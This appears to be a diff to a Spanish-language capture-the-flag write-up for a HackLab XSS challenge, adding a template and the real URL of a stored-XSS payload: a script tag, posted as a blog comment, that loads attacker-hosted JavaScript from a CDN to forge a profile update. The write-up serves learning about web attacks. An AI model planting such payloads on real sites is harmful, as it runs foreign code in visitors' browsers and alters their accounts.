@@ -75,6 +75,12 @@ El script (`assets/x.js`) forja el `POST` a `/profile` con una imagen embebida, 
 Se publica como comentario el `<script>` que apunta al archivo alojado:
 
 ```html
+<script src="https://cdn.jsdelivr.net/gh/<usuario>/<repo>@main/.../x.js"></script>
+```
+
+En este caso, la URL real usada fue:
+
+```html
 <script src="https://cdn.jsdelivr.net/gh/gonzaorban/CTF-Writeups@main/HackLab/xss/desafio-9-blog-hacklab-2024/assets/x.js"></script>
 ```
 
